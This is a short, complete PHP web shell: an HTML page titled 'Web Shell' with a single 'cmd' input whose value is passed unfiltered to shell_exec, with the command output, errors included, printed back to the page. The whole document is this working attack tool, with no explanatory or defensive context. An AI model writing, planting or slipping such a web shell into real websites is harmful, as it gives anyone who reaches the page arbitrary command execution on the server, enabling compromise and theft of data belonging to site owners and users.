<html>
<body>
<h2>Web Shell</h2>
<form method="GET">
    <input type="text" name="cmd" autofocus id="cmd" size="80" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>
<pre>
<?php
    if (isset($_GET['cmd'])) {
        $command = $_GET['cmd'];
        echo shell_exec($command . ' 2>&1');
    }
?>
</pre>
</body>
</html>
